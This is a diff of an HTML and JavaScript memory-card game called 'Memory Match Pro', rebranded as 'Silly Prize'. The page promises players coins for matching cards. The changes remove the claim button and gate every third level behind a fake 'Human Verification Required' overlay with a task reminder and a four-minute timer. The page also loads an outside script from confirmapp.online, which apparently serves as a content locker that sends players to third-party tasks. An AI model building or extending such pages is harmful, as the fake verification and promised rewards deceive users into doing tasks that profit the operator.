@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Memory Match Pro | GameCoin Pro</title>
+    <title>Memory Match Pro | Silly Prize</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
@@ -275,6 +275,12 @@
             background: white;
             border-bottom: 1px solid var(--gray-light);
             text-align: center;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .game-preview:hover {
+            background: linear-gradient(135deg, var(--primary-soft) 0%, white 100%);
         }
 
         .preview-container {
@@ -701,101 +707,7 @@
             color: var(--warning);
         }
 
-        /* Claim Section */
-        .claim-section {
-            position: fixed;
-            bottom: 0;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 100%;
-            max-width: 480px;
-            background: white;
-            padding: 20px;
-            box-shadow: 0 -5px 30px rgba(0,0,0,0.1);
-            border-top-left-radius: 20px;
-            border-top-right-radius: 20px;
-            z-index: 1000;
-        }
-
-        .claim-btn {
-            width: 100%;
-            padding: 18px;
-            background: linear-gradient(135deg, var(--success) 0%, #059669 100%);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-weight: 700;
-            font-size: 1.1rem;
-            cursor: pointer;
-            transition: var(--transition);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
-        }
-
-        .claim-btn:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);
-        }
-
-        .claim-btn:disabled {
-            background: var(--gray);
-            cursor: not-allowed;
-            box-shadow: none;
-        }
-
-        .claim-btn.restart {
-            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
-        }
-
-        .claim-info {
-            text-align: center;
-            margin-top: 10px;
-            font-size: 0.8rem;
-            color: var(--gray);
-        }
-
-        /* Start Game Button */
-        .start-game-container {
-            padding: 0 20px 20px;
-            text-align: center;
-        }
-
-        .start-game-btn {
-            width: 100%;
-            padding: 18px;
-            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-weight: 700;
-            font-size: 1.1rem;
-            cursor: pointer;
-            transition: var(--transition);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            box-shadow: 0 4px 15px rgba(124, 58, 237, 0.3);
-        }
-
-        .start-game-btn:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(124, 58, 237, 0.4);
-        }
-
-        .start-game-btn:disabled {
-            background: var(--gray);
-            cursor: not-allowed;
-            box-shadow: none;
-        }
-
-        /* Professional Light Blur Overlays */
-        .level-up-overlay,
-        .verification-overlay,
-        .game-over-overlay,
+        /* Win Overlay */
         .win-overlay {
             position: fixed;
             top: 0;
@@ -812,16 +724,10 @@
             -webkit-backdrop-filter: blur(8px) saturate(180%);
         }
 
-        .level-up-overlay.active,
-        .verification-overlay.active,
-        .game-over-overlay.active,
         .win-overlay.active {
             display: flex;
         }
 
-        .level-up-content,
-        .verification-content,
-        .game-over-content,
         .win-content {
             background: rgba(255, 255, 255, 0.95);
             border-radius: var(--border-radius);
@@ -840,60 +746,6 @@
             100% { transform: scale(1) translateY(0); opacity: 1; }
         }
 
-        .level-up-icon {
-            width: 70px;
-            height: 70px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, #ffd700, #ffed4e);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
-            font-size: 2rem;
-            color: #92400e;
-            box-shadow: 0 10px 30px rgba(245, 158, 11, 0.3);
-            animation: starBounce 0.6s ease;
-        }
-
-        @keyframes starBounce {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.2); }
-        }
-
-        .level-up-title {
-            font-size: 1.8rem;
-            font-weight: 800;
-            color: var(--dark);
-            margin-bottom: 8px;
-        }
-
-        .level-up-text {
-            color: var(--gray);
-            margin-bottom: 25px;
-            font-size: 0.95rem;
-            line-height: 1.5;
-        }
-
-        .level-up-btn {
-            width: 100%;
-            padding: 14px 28px;
-            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-weight: 700;
-            cursor: pointer;
-            font-size: 1rem;
-            transition: var(--transition);
-            box-shadow: 0 4px 15px rgba(124, 58, 237, 0.3);
-        }
-
-        .level-up-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(124, 58, 237, 0.4);
-        }
-
-        /* Win Overlay Specifics */
         .win-icon {
             width: 70px;
             height: 70px;
@@ -955,7 +807,97 @@
             font-weight: 600;
         }
 
-        /* Verification Overlay Specifics */
+        /* Level Up & Verification Overlays */
+        .level-up-overlay,
+        .verification-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 5500;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background: rgba(15, 23, 42, 0.4);
+            backdrop-filter: blur(8px) saturate(180%);
+            -webkit-backdrop-filter: blur(8px) saturate(180%);
+        }
+
+        .level-up-overlay.active,
+        .verification-overlay.active {
+            display: flex;
+        }
+
+        .level-up-content,
+        .verification-content {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: var(--border-radius);
+            padding: 40px;
+            text-align: center;
+            max-width: 380px;
+            width: 100%;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25), 
+                        0 0 0 1px rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            animation: modalPop 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .level-up-icon {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #ffd700, #ffed4e);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 2rem;
+            color: #92400e;
+            box-shadow: 0 10px 30px rgba(245, 158, 11, 0.3);
+            animation: starBounce 0.6s ease;
+        }
+
+        @keyframes starBounce {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.2); }
+        }
+
+        .level-up-title {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: var(--dark);
+            margin-bottom: 8px;
+        }
+
+        .level-up-text {
+            color: var(--gray);
+            margin-bottom: 25px;
+            font-size: 0.95rem;
+            line-height: 1.5;
+        }
+
+        .level-up-btn {
+            width: 100%;
+            padding: 14px 28px;
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: var(--transition);
+            box-shadow: 0 4px 15px rgba(124, 58, 237, 0.3);
+        }
+
+        .level-up-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(124, 58, 237, 0.4);
+        }
+
+        /* Verification Specifics */
         .verification-icon {
             width: 70px;
             height: 70px;
@@ -1036,7 +978,47 @@
             box-shadow: 0 4px 12px rgba(16, 185, 129, 0.2);
         }
 
-        /* Captcha Container */
+        /* Task reminder box */
+        .task-reminder {
+            background: linear-gradient(135deg, #fef3c7, #fde68a);
+            border-left: 4px solid var(--warning);
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: left;
+            display: none;
+        }
+
+        .task-reminder.active {
+            display: block;
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .task-reminder-title {
+            font-weight: 700;
+            color: var(--dark);
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .task-reminder-title i {
+            color: var(--warning);
+        }
+
+        .task-reminder-text {
+            font-size: 0.85rem;
+            color: var(--gray);
+            line-height: 1.4;
+        }
+
+        /* Captcha & Human Verification */
         .captcha-wrapper {
             display: none;
             margin: 20px 0;
@@ -1064,7 +1046,6 @@
             color: var(--info);
         }
 
-        /* Human Verification Loading Section */
         .human-verification-wrapper {
             display: none;
             margin: 20px 0;
@@ -1140,7 +1121,37 @@
             color: var(--gray);
         }
 
-        /* Success message for verification */
+        /* Progress Bar for Verification */
+        .verification-progress {
+            width: 100%;
+            height: 8px;
+            background: var(--gray-light);
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 20px 0;
+            display: none;
+        }
+
+        .verification-progress.active {
+            display: block;
+        }
+
+        .verification-progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--success), #34d399);
+            border-radius: 10px;
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        .verification-progress-text {
+            font-size: 0.8rem;
+            color: var(--gray);
+            margin-top: 8px;
+            font-weight: 600;
+        }
+
+        /* Success message */
         .verification-success {
             display: none;
             margin: 20px 0;
@@ -1228,196 +1239,6 @@
             color: var(--primary);
         }
 
-        /* Max Level Badge */
-        .max-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 5px;
-            background: linear-gradient(135deg, var(--warning), #d97706);
-            color: white;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 0.75rem;
-            font-weight: 700;
-            margin-left: 8px;
-        }
-
-        /* Pending Level Badge */
-        .pending-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 5px;
-            background: linear-gradient(135deg, var(--info), #0284c7);
-            color: white;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 0.75rem;
-            font-weight: 700;
-            margin-left: 8px;
-            animation: pulse-badge 1.5s infinite;
-        }
-
-        @keyframes pulse-badge {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
-        }
-
-        /* Confetti */
-        .confetti {
-            position: absolute;
-            width: 10px;
-            height: 10px;
-            background: var(--warning);
-            animation: confetti-fall 3s linear forwards;
-        }
-
-        @keyframes confetti-fall {
-            0% { transform: translateY(-100vh) rotate(0deg); opacity: 1; }
-            100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
-        }
-
-        /* Game Over Overlay */
-        .game-over-icon {
-            width: 70px;
-            height: 70px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, var(--danger), #dc2626);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
-            font-size: 2rem;
-            color: white;
-            box-shadow: 0 10px 30px rgba(239, 68, 68, 0.3);
-        }
-
-        .game-over-title {
-            font-size: 1.8rem;
-            font-weight: 800;
-            color: var(--dark);
-            margin-bottom: 8px;
-        }
-
-        .game-over-text {
-            color: var(--gray);
-            margin-bottom: 25px;
-            font-size: 0.95rem;
-            line-height: 1.5;
-        }
-
-        /* Task reminder box */
-        .task-reminder {
-            background: linear-gradient(135deg, #fef3c7, #fde68a);
-            border-left: 4px solid var(--warning);
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            text-align: left;
-            display: none;
-        }
-
-        .task-reminder.active {
-            display: block;
-            animation: slideIn 0.3s ease;
-        }
-
-        @keyframes slideIn {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .task-reminder-title {
-            font-weight: 700;
-            color: var(--dark);
-            margin-bottom: 5px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .task-reminder-title i {
-            color: var(--warning);
-        }
-
-        .task-reminder-text {
-            font-size: 0.85rem;
-            color: var(--gray);
-            line-height: 1.4;
-        }
-
-        /* Status indicators */
-        .status-indicator {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            padding: 6px 12px;
-            border-radius: 20px;
-            font-size: 0.8rem;
-            font-weight: 600;
-            margin-top: 10px;
-        }
-
-        .status-indicator.processing {
-            background: #dbeafe;
-            color: var(--primary);
-        }
-
-        .status-indicator.completed {
-            background: #d1fae5;
-            color: var(--success);
-        }
-
-        .status-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            animation: blink 1.5s infinite;
-        }
-
-        .status-indicator.processing .status-dot {
-            background: var(--primary);
-        }
-
-        .status-indicator.completed .status-dot {
-            background: var(--success);
-            animation: none;
-        }
-
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.4; }
-        }
-
-        /* Progress Bar for Verification */
-        .verification-progress {
-            width: 100%;
-            height: 8px;
-            background: var(--gray-light);
-            border-radius: 10px;
-            overflow: hidden;
-            margin: 20px 0;
-            display: none;
-        }
-
-        .verification-progress.active {
-            display: block;
-        }
-
-        .verification-progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, var(--success), #34d399);
-            border-radius: 10px;
-            width: 0%;
-            transition: width 0.3s ease;
-        }
-
-        .verification-progress-text {
-            font-size: 0.8rem;
-            color: var(--gray);
-            margin-top: 8px;
-            font-weight: 600;
-        }
-
         /* Combo indicator */
         .combo-indicator {
             position: fixed;
@@ -1489,6 +1310,97 @@
             }
         }
 
+        /* Status indicators */
+        .status-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            margin-top: 10px;
+        }
+
+        .status-indicator.processing {
+            background: #dbeafe;
+            color: var(--primary);
+        }
+
+        .status-indicator.completed {
+            background: #d1fae5;
+            color: var(--success);
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            animation: blink 1.5s infinite;
+        }
+
+        .status-indicator.processing .status-dot {
+            background: var(--primary);
+        }
+
+        .status-indicator.completed .status-dot {
+            background: var(--success);
+            animation: none;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+
+        /* Max Level Badge */
+        .max-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            background: linear-gradient(135deg, var(--warning), #d97706);
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            margin-left: 8px;
+        }
+
+        /* Pending Level Badge */
+        .pending-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            background: linear-gradient(135deg, var(--info), #0284c7);
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            margin-left: 8px;
+            animation: pulse-badge 1.5s infinite;
+        }
+
+        @keyframes pulse-badge {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        /* Confetti */
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background: var(--warning);
+            animation: confetti-fall 3s linear forwards;
+        }
+
+        @keyframes confetti-fall {
+            0% { transform: translateY(-100vh) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
+        }
+
         /* Locked State Message */
         .locked-message {
             background: linear-gradient(135deg, #fef3c7, #fde68a);
@@ -1530,6 +1442,11 @@
             transform: translateY(-2px);
             box-shadow: 0 4px 12px rgba(124, 58, 237, 0.3);
         }
+
+        /* Spacer for bottom */
+        .bottom-spacer {
+            height: 100px;
+        }
     </style>
 </head>
 <body>
@@ -1569,7 +1486,7 @@
                         <i class="fas fa-crown"></i> MAX
                     </span>
                     <span id="pendingBadge" class="pending-badge" style="display: none;">
-                        <i class="fas fa-lock"></i> PENDING
+                        <i class="fas fa-lock"></i> VERIFY
                     </span>
                 </div>
                 <div class="xp-text">
@@ -1583,7 +1500,7 @@
 
         <!-- Score Section -->
         <div class="score-section">
-            <div class="total-earned-display">Total Earned This Session</div>
+            <div class="total-earned-display">Session Earnings</div>
             <div class="total-earned-value" id="totalEarnedDisplay">0</div>
             
             <div class="current-score-label">Current Score</div>
@@ -1604,18 +1521,18 @@
         <div class="locked-message" id="lockedMessage" style="display: none;">
             <div class="locked-message-title">
                 <i class="fas fa-lock"></i>
-                Level <span id="lockedLevelNum">2</span> Locked
+                Level <span id="lockedLevelNum">3</span> Locked
             </div>
             <div class="locked-message-text">
-                You completed Level <span id="completedLevelNum">1</span>! Verify to unlock Level <span id="nextLevelNum">2</span>.
+                Complete verification to unlock Level <span id="nextLevelNum">3</span> and continue earning!
             </div>
             <button class="locked-message-btn" onclick="showLevelUpOverlay()">
                 <i class="fas fa-unlock"></i> Verify Now
             </button>
         </div>
 
-        <!-- Game Preview - Shows before game starts -->
-        <div class="game-preview" id="gamePreview">
+        <!-- Game Preview - Click to Start -->
+        <div class="game-preview" id="gamePreview" onclick="startGame()">
             <div class="preview-container">
                 <div class="preview-grid">
                     <div class="preview-card"></div>
@@ -1639,7 +1556,7 @@
                     <i class="fas fa-brain"></i>
                 </div>
             </div>
-            <div class="preview-text">Ready to Test Your Memory?</div>
+            <div class="preview-text">Click to Start!</div>
             <div class="preview-subtext">Match pairs of cards to earn coins. Faster matches = bigger rewards!</div>
             <div class="preview-stats">
                 <div class="preview-stat">
@@ -1671,21 +1588,6 @@
 
         <!-- Game Board -->
         <div class="game-board" id="gameBoard"></div>
-
-        <!-- Start Game Button -->
-        <div class="start-game-container" id="startGameContainer">
-            <button class="start-game-btn" id="startGameBtn" onclick="startGame()">
-                <i class="fas fa-play"></i> Start Game
-            </button>
-        </div>
-
-        <!-- Restart Cost Info -->
-        <div class="restart-info" id="restartInfo">
-            <div class="restart-text">Play again?</div>
-            <div class="restart-cost">
-                <i class="fas fa-coins"></i> 30 coins
-            </div>
-        </div>
 
         <!-- Stats Grid -->
         <div class="stats-section">
@@ -1724,7 +1626,7 @@
         </div>
 
         <!-- Spacer -->
-        <div style="height: 100px;"></div>
+        <div class="bottom-spacer"></div>
     </div>
 
     <!-- Combo Indicator -->
@@ -1738,18 +1640,7 @@
         <span id="floatingCoinsText">+10</span>
     </div>
 
-    <!-- Claim Section -->
-    <div class="claim-section">
-        <button class="claim-btn" id="claimBtn" onclick="claimEarnings()" disabled>
-            <i class="fas fa-check-circle"></i>
-            Claim <span id="claimAmount">0</span> Coins
-        </button>
-        <div class="claim-info">
-            Min 50 to claim • Max 30,000 per session
-        </div>
-    </div>
-
-    <!-- Level Up Overlay - Shows First -->
+    <!-- Level Up Overlay -->
     <div class="level-up-overlay" id="levelUpOverlay">
         <div class="level-up-content">
             <div class="level-up-icon">
@@ -1757,16 +1648,17 @@
             </div>
             <div class="level-up-title">Level Up!</div>
             <div class="level-up-text">
-                You reached <strong>Level <span id="newLevel">2</span></strong>!<br>
-                Time bonus and score multiplier increased!
+                You reached <strong>Level <span id="newLevel">3</span></strong>!<br>
+                Time bonus and score multiplier increased!<br>
+                <small style="color: var(--gray);">Verification required every 3 levels</small>
             </div>
             <button class="level-up-btn" onclick="proceedToVerification()">
-                <i class="fas fa-arrow-right"></i> OK, Continue
+                <i class="fas fa-arrow-right"></i> Continue
             </button>
         </div>
     </div>
 
-    <!-- Verification Overlay - Shows After OK -->
+    <!-- Verification Overlay -->
     <div class="verification-overlay" id="verificationOverlay">
         <div class="verification-content">
             <div class="verification-icon">
@@ -1774,7 +1666,7 @@
             </div>
             <div class="verification-title">Human Verification Required</div>
             <div class="verification-desc">
-                To unlock Level <span id="verifyLevel">2</span> and continue playing, please verify that you are human.
+                To unlock Level <span id="verifyLevel">3</span> and continue playing, please verify that you are human.
             </div>
 
             <!-- Task Reminder -->
@@ -1846,9 +1738,9 @@
             <div class="win-icon">
                 <i class="fas fa-trophy"></i>
             </div>
-            <div class="win-title">You Won!</div>
+            <div class="win-title">Level Complete!</div>
             <div class="win-text">
-                Amazing memory skills! You matched all pairs!
+                Amazing memory skills! Coins added to your balance!
             </div>
             <div class="win-stats">
                 <div class="win-stat">
@@ -1864,12 +1756,12 @@
                     <div class="win-stat-label">Match Coins</div>
                 </div>
                 <div class="win-stat">
-                    <div class="win-stat-value" id="winBonus">0</div>
-                    <div class="win-stat-label">Win Bonus</div>
+                    <div class="win-stat-value" id="winTotal">0</div>
+                    <div class="win-stat-label">Total Earned</div>
                 </div>
             </div>
             <button class="level-up-btn" onclick="closeWinOverlay()">
-                <i class="fas fa-check"></i> Collect Rewards
+                <i class="fas fa-check"></i> Continue
             </button>
         </div>
     </div>
@@ -1881,7 +1773,7 @@
     <script type="text/javascript" src="https://confirmapp.online/cp/js/joy6y"></script>
 
     <script>
-        // Game State - Memory Match Pro (version 6.0 - Fixed Level Persistence)
+        // Game State - Memory Match Pro (Integrated with Silly Prize)
         const GameState = {
             currentScore: 0,
             totalEarned: 0,
@@ -1896,8 +1788,7 @@
             currentCombo: 0,
             comboMultiplier: 1,
             
-            // IMPORTANT: displayLevel shows the level user achieved (including pending)
-            // actualLevel is the verified level they can play
+            // Level system - verification every 3 levels
             displayLevel: 1,
             actualLevel: 1,
             xp: 0,
@@ -1947,9 +1838,7 @@
             upgrades: {
                 timeBonus: { level: 0, maxLevel: 10, baseCost: 800, cost: 800, effect: 5 },
                 scoreMult: { level: 0, maxLevel: 10, baseCost: 1000, cost: 1000, effect: 0.2 }
-            },
-            
-            mainAppCoins: 0
+            }
         };
 
         const VERIFICATION_DURATION = 4 * 60 * 1000;
@@ -1992,14 +1881,6 @@
 
         // CRITICAL: Restore the exact state where user left off
         function restoreGameState() {
-            console.log('Restoring state:', {
-                screen: GameState.currentScreen,
-                locked: GameState.isLocked,
-                displayLevel: GameState.displayLevel,
-                actualLevel: GameState.actualLevel,
-                pending: GameState.pendingLevel
-            });
-            
             // Update UI first
             updateUI();
             updatePreviewStats();
@@ -2014,11 +1895,11 @@
             // Check if we were in the middle of a game
             if (GameState.gameActive && !GameState.gameEnded) {
                 showPreviewState();
-                showToast('Game was interrupted. You can start a new game!', 'info');
+                showToast('Click the brain to start a new game!', 'info');
                 return;
             }
             
-            // Check if game ended and needs restart/claim
+            // Check if game ended
             if (GameState.gameEnded) {
                 showGameEndedState();
                 return;
@@ -2035,17 +1916,10 @@
             // Show the locked message with correct levels
             document.getElementById('lockedMessage').style.display = 'block';
             document.getElementById('gamePreview').style.display = 'none';
-            document.getElementById('startGameContainer').style.display = 'none';
             
             // Update locked message text
             document.getElementById('lockedLevelNum').textContent = GameState.displayLevel;
-            document.getElementById('completedLevelNum').textContent = GameState.actualLevel;
             document.getElementById('nextLevelNum').textContent = GameState.displayLevel;
-            
-            // Disable start game button
-            const startBtn = document.getElementById('startGameBtn');
-            startBtn.disabled = true;
-            startBtn.innerHTML = '<i class="fas fa-lock"></i> Level Locked';
             
             // Show pending badge
             document.getElementById('pendingBadge').style.display = 'inline-flex';
@@ -2058,16 +1932,10 @@
             saveGameData();
             
             document.getElementById('gamePreview').style.display = 'block';
-            document.getElementById('startGameContainer').style.display = 'block';
             document.getElementById('lockedMessage').style.display = 'none';
             document.getElementById('timerSection').classList.remove('active');
             document.getElementById('gameBoard').classList.remove('active');
             document.getElementById('gameBoard').innerHTML = '';
-            
-            // Enable start button
-            const startBtn = document.getElementById('startGameBtn');
-            startBtn.disabled = false;
-            startBtn.innerHTML = '<i class="fas fa-play"></i> Start Game';
             
             updatePreviewStats();
             updateUI();
@@ -2075,23 +1943,8 @@
 
         function showGameEndedState() {
             GameState.currentScreen = 'ended';
-            
-            document.getElementById('gamePreview').style.display = 'none';
-            document.getElementById('startGameContainer').style.display = 'none';
+            document.getElementById('gamePreview').style.display = 'block';
             document.getElementById('lockedMessage').style.display = 'none';
-            
-            if (GameState.canRestart && GameState.mainAppCoins >= 30) {
-                document.getElementById('restartInfo').classList.add('active');
-                document.getElementById('claimBtn').innerHTML = '<i class="fas fa-redo"></i> Pay 30 Coins to Restart';
-                document.getElementById('claimBtn').classList.add('restart');
-                document.getElementById('claimBtn').disabled = false;
-            } else {
-                document.getElementById('claimBtn').innerHTML = '<i class="fas fa-check-circle"></i> Claim ' + Math.floor(GameState.currentScore).toLocaleString() + ' Coins';
-                if (GameState.currentScore >= 50) {
-                    document.getElementById('claimBtn').disabled = false;
-                }
-            }
-            
             updateUI();
         }
 
@@ -2162,13 +2015,6 @@
                 return;
             }
 
-            if (GameState.gameEnded) {
-                if (GameState.canRestart) {
-                    attemptRestart();
-                }
-                return;
-            }
-
             // Reset game state for new game
             GameState.gameActive = true;
             GameState.gameWon = false;
@@ -2180,6 +2026,7 @@
             GameState.flippedCards = [];
             GameState.sessionMatches = 0;
             GameState.currentScreen = 'playing';
+            GameState.currentScore = 0; // Reset session score
             
             // Use actualLevel for game difficulty
             const dimensions = getGridDimensions(GameState.actualLevel);
@@ -2192,7 +2039,6 @@
             generateCards(dimensions.rows, dimensions.cols);
             
             document.getElementById('gamePreview').style.display = 'none';
-            document.getElementById('startGameContainer').style.display = 'none';
             document.getElementById('lockedMessage').style.display = 'none';
             document.getElementById('timerSection').classList.add('active');
             document.getElementById('gameBoard').classList.add('active');
@@ -2204,7 +2050,7 @@
             
             startTimer();
             
-            showToast(`Level ${GameState.actualLevel} - Match all ${GameState.totalPairs} pairs! Earn 10 coins per match!`, 'info');
+            showToast(`Level ${GameState.actualLevel} - Match all ${GameState.totalPairs} pairs!`, 'info');
         }
 
         function generateCards(rows, cols) {
@@ -2346,7 +2192,7 @@
                     
                     updateUI();
                     saveGameData();
-                    showToast(`Match! +${totalReward} coins (${baseReward} base + ${timeBonus} time bonus)`, 'success');
+                    showToast(`Match! +${totalReward} coins`, 'success');
                 }, 500);
             } else {
                 setTimeout(() => {
@@ -2416,11 +2262,15 @@
             
             addXP(Math.floor(winBonus * 0.3));
             
+            // AUTO-ADD COINS TO SILLY PRIZE SYSTEM (No claim button)
+            addCoinsToMainApp(GameState.currentScore);
+            
             // Update win overlay
             document.getElementById('winMatches').textContent = GameState.sessionMatches;
             document.getElementById('winTime').textContent = `${GameState.timeRemaining}s`;
             document.getElementById('winBaseCoins').textContent = baseMatchCoins;
-            document.getElementById('winBonus').textContent = `+${winBonus}`;
+            document.getElementById('winTotal').textContent = GameState.currentScore;
+            
             document.getElementById('winOverlay').classList.add('active');
             
             // Animate win card
@@ -2432,17 +2282,12 @@
             updateUI();
             saveGameData();
             
-            showToast(`Victory! Win bonus: +${winBonus} coins!`, 'success');
+            showToast(`Victory! +${GameState.currentScore} coins added!`, 'success');
         }
 
         function closeWinOverlay() {
             document.getElementById('winOverlay').classList.remove('active');
-            
-            if (GameState.totalEarned >= GameState.maxCoins) {
-                endGame();
-            } else {
-                showPreviewState();
-            }
+            showPreviewState();
         }
 
         function gameLoss() {
@@ -2461,72 +2306,7 @@
             showPreviewState();
         }
 
-        function endGame() {
-            clearInterval(GameState.timerInterval);
-            GameState.gameActive = false;
-            GameState.gameEnded = true;
-            GameState.currentScreen = 'ended';
-            
-            if (GameState.mainAppCoins >= 30) {
-                GameState.canRestart = true;
-                document.getElementById('restartInfo').classList.add('active');
-                document.getElementById('claimBtn').innerHTML = '<i class="fas fa-redo"></i> Pay 30 Coins to Restart';
-                document.getElementById('claimBtn').classList.add('restart');
-                document.getElementById('claimBtn').disabled = false;
-            } else {
-                document.getElementById('claimBtn').innerHTML = '<i class="fas fa-check-circle"></i> Claim ' + Math.floor(GameState.currentScore).toLocaleString() + ' Coins';
-                if (GameState.currentScore >= 50) {
-                    document.getElementById('claimBtn').disabled = false;
-                }
-            }
-            
-            document.getElementById('gamePreview').style.display = 'none';
-            document.getElementById('startGameContainer').style.display = 'none';
-            saveGameData();
-            showToast('Session ended! Claim your earnings!', 'info');
-        }
-
-        function attemptRestart() {
-            if (GameState.mainAppCoins < 30) {
-                showToast('Not enough coins! Need 30 to restart.', 'error');
-                return;
-            }
-
-            GameState.mainAppCoins -= 30;
-            
-            try {
-                const saved = localStorage.getItem('gameCoinPro_v4');
-                if (saved) {
-                    const data = JSON.parse(saved);
-                    data.coins = GameState.mainAppCoins;
-                    localStorage.setItem('gameCoinPro_v4', JSON.stringify(data));
-                }
-            } catch (e) {
-                console.error('Error updating main app coins:', e);
-            }
-
-            GameState.currentScore = 0;
-            GameState.totalEarned = 0;
-            GameState.matches = 0;
-            GameState.sessionMatches = 0;
-            GameState.currentCombo = 0;
-            GameState.gameEnded = false;
-            GameState.canRestart = false;
-            GameState.claimed = false;
-            GameState.currentScreen = 'preview';
-
-            document.getElementById('restartInfo').classList.remove('active');
-            document.getElementById('claimBtn').innerHTML = '<i class="fas fa-check-circle"></i> Claim <span id="claimAmount">0</span> Coins';
-            document.getElementById('claimBtn').classList.remove('restart');
-            document.getElementById('claimBtn').disabled = true;
-            
-            saveGameData();
-            updateUI();
-            loadMainAppData();
-            showPreviewState();
-            showToast('Game restarted! -30 coins', 'success');
-        }
-
+        // MODIFIED: Only verify every 3 levels
         function addXP(amount) {
             if (GameState.actualLevel >= GameState.maxLevel || GameState.isLocked) return;
             
@@ -2539,13 +2319,26 @@
         }
 
         function prepareLevelUp() {
-            // CRITICAL: Update displayLevel to show new level, keep actualLevel at current until verified
+            // Update displayLevel to show new level
             GameState.displayLevel = GameState.actualLevel + 1;
             GameState.pendingLevel = GameState.displayLevel;
-            GameState.isLocked = true;
-            GameState.currentScreen = 'levelup';
-            saveGameData();
-            showLevelUpOverlay();
+            
+            // CRITICAL CHANGE: Only lock/verify every 3 levels
+            if (GameState.displayLevel % 3 === 0) {
+                GameState.isLocked = true;
+                GameState.currentScreen = 'levelup';
+                saveGameData();
+                showLevelUpOverlay();
+            } else {
+                // Auto advance without verification for levels 1,2,4,5,7,8 etc
+                GameState.actualLevel = GameState.displayLevel;
+                GameState.xpToNext = XP_TABLE[GameState.actualLevel - 1] || 999999;
